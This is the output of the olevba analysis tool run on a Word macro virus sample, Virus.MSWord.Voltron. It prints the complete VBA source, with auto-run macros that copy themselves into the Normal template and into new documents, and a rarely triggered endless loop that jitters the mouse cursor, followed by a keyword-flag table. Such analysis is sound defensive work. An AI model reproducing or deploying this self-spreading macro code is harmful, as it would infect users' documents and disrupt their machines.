olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Voltron
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Voltron - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Voltron - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Type POINTAPI
    VoltronX1 As Long
    VoltronY1 As Long
End Type
Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
Declare Function SetCursorPos Lib "user32" (ByVal x As Long, ByVal y As Long) As Long
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro created 00/00/00 by XXXXXX"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.AutoOpen"
On Error GoTo exiting
    Application.OrganizerCopy _
    Source:=ActiveDocument.Name, _
    Destination:=NormalTemplate.FullName, Name:="NewMacros", _
    Object:=wdOrganizerObjectProjectItems
    Exit Sub
exiting:
End Sub
Sub AutoNew()
On Error GoTo exiting
    Application.OrganizerCopy _
    Source:=NormalTemplate.FullName, _
    Destination:=ActiveDocument.Name, Name:="NewMacros", _
    Object:=wdOrganizerObjectProjectItems
    Call DoMyStuff
    Exit Sub
exiting:
End Sub
Sub AutoClose()
On Error GoTo exiting
    Application.OrganizerCopy _
    Source:=NormalTemplate.FullName, _
    Destination:=ActiveDocument.Name, Name:="NewMacros", _
    Object:=wdOrganizerObjectProjectItems
    Exit Sub
exiting:
End Sub
Sub DoMyStuff()
On Error GoTo exiting
Dim Voltron As POINTAPI
Dim VoltronV As Long
Dim VoltronX As Long
Dim VoltronY As Long
Dim VoltronA As Long
Dim VoltronR As Long
    If Rnd * 100 > 1 Then
        Exit Sub
    Else
        While Not 1
            DoEvents
            VoltronV = GetCursorPos(Voltron)
            VoltronX = Voltron.VoltronX1
            VoltronY = Voltron.VoltronY1
            VoltronA = Int(Rnd * 4) + 1
            Select Case VoltronA
                Case Is = 1: VoltronX = VoltronX + 1
                Case Is = 2: VoltronX = VoltronX - 1
                Case Is = 3: VoltronY = VoltronY + 1
                Case Is = 4: VoltronY = VoltronY - 1
            End Select
            VoltronR = SetCursorPos(VoltronX, VoltronY)
        Wend
    End If
exiting:
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
+----------+--------------------+---------------------------------------------+

